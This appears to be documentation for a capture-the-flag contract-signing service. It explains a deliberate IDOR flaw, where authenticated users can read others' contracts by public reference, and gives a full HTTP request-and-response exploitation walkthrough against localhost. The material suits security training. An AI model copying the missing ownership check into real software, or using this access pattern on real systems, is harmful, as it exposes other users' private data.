# Service documentation

This is the place to keep important documentation details about the service.

SignMeMaybe stores CTF flags as the text content of contracts created by the checker. Every contract receives a public `reference` such as `CNTR-...`; internal numeric IDs are not exposed by the API.

## Contract Reference IDOR

The main branch intentionally exposes an Insecure Direct Object Reference (IDOR) in the contract retrieval endpoints. Authentication is required, but latest contract retrieval does not enforce contract ownership once a caller knows a public contract reference.

*   **Public Metadata:** `GET /api/users/{username}/contracts` returns public contract metadata for a holder username, including contract references.
*   **Latest Version Retrieval:** `GET /api/contracts/{reference}/versions/latest` requires a valid session token, but does not require the authenticated user to own the requested contract.
*   **PDF Retrieval:** `GET /api/contracts/{reference}/versions/latest/pdf` mirrors the same authorization gap before returning a generated PDF.
*   **Non-owner Behavior:** Requests for another user's contract return `200 OK` when the reference exists and the caller has any valid session. Missing references still return `404 Not Found`.

## Flags:

*   **Contract Content:** The checker stores flags in the `content` field of a contract created during `putflag`.
*   **Attack Hint:** `putflag` returns the owner username as the attack hint and keeps the owner's credentials plus contract reference in checker state for `getflag`.
*   **Access Rule:** The flag remains retrievable by the owning checker account and is also retrievable by a different authenticated user who resolves the public contract reference.

---

## Exploitation Path

The intended exploit uses the checker-provided owner username to discover public contract references, then reads the latest contract version with an attacker-controlled session.

### IDOR Check

Register an attacker account:

```http
POST /api/register HTTP/1.1
Host: localhost:1984
Content-Type: application/json

{
  "username": "attacker_user",
  "password": "attacker_password"
}
```

The service returns a session token:

```json
{
  "userId": 2,
  "username": "attacker_user",
  "token": "<SESSION_TOKEN>"
}
```

Use the target username from the attack hint to fetch public contract metadata:

```http
GET /api/users/arden_ledger_12345/contracts HTTP/1.1
Host: localhost:1984
Accept: application/json
```

The public metadata response includes contract references for that holder:

```json
{
  "username": "arden_ledger_12345",
  "contracts": [
    {
      "reference": "CNTR-0123456789abcdef01234567",
      "title": "Signing Package example",
      "latestVersion": {
        "versionNumber": 1,
        "approvalState": "draft"
      }
    }
  ]
}
```

Use the attacker token to fetch the latest version by reference:

```http
GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest HTTP/1.1
Host: localhost:1984
X-Session-Token: <SESSION_TOKEN>
Accept: application/json
```

On `main`, this returns `200 OK` even when the contract belongs to another user:

```json
{
  "reference": "CNTR-0123456789abcdef01234567",
  "ownerUsername": "arden_ledger_12345",
  "requestedByUsername": "attacker_user",
  "content": "<FLAG>"
}
```

The generated PDF endpoint follows the same IDOR:

```http
GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest/pdf HTTP/1.1
Host: localhost:1984
X-Session-Token: <SESSION_TOKEN>
```

The owner can still fetch the contract normally with their own token:

```http
GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest HTTP/1.1
Host: localhost:1984
X-Session-Token: <OWNER_SESSION_TOKEN>
Accept: application/json
```